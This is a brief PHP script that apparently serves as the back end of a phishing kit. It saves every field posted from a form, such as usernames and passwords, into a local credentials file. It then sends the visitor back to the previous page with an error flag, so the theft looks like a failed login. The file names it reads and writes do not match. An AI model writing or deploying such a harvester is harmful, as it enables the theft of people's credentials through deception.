<?php
if (!empty($_POST)) {
	$credentials = file_get_contents('creds.json');
	$array = json_decode($credentials);
	$array[] = $_POST;
	file_put_contents('creds.txt', json_encode($array));
	header("Location: ".$_SERVER['HTTP_REFERER']."?error=1");
}
?>